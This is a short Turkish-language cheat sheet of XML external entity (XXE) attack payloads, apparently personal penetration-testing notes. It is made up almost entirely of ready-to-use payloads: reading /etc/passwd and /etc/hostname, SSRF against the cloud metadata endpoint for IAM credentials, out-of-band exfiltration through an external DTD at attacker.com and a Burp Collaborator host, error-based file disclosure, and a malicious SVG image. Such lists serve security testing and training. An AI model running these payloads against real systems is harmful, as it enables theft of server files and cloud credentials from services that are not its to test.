---
title: XXE
order: 3
---

## TIPS

- Normal Entity eklemek

```bash
<!DOCTYPE foo [<!ENTITY xxe "testing123">]>
<test>&xxe;</test>
```

- Dahili dosyaları görüntülemek

```bash
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<test>&xxe;</test>
```

- SSRF

```bash
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<test>&xxe;</test>
```

```bash
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost/admin">]>
<test>&xxe;</test>
```

- Kendi sunucuma veya Burp Collaborator’e yönlendirmek

```bash
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
<test>&xxe;</test>

```

- General Entity → &xxe;
- Parameter Entity → %xxe;
- Parametre Entity eklemek

```bash
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe;]>
```

- Harici DTD

```bash
<!DOCTYPE stockCheck [

<!ENTITY % dtd SYSTEM "http://attacker.com/exploit.dtd">

%dtd;

]>
```

- exploit.dtd payload

```bash
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

- Error-based exploit.dtd payload

```bash
<!ENTITY % file SYSTEM "file:///etc/passwd">

<!ENTITY % eval "
<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'> → geçersiz dosya yolu
">

%eval;
%error;
```

- XML keşfi

```bash
productId=<test>1</test>&storeId=1
```

- SVG görsel payload

```bash
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
    <text x="0" y="16">&xxe;</text>
</svg>
```